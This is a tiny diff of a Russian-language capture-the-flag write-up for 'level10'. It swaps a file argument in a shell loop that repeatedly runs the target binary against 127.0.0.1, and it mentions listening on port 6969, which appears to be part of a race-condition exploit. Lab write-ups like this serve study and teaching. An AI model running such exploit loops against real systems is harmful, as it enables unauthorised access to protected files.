@@ -17,7 +17,7 @@ done
 Затем мы будем бесконечно вызывать ./level10
 
 while true; 
-do ./level10 /tmp/exploit 127.0.0.1; 
+do ./level10 /tmp/aaa 127.0.0.1; 
 done
 
 Начинаем слушать порт 6969
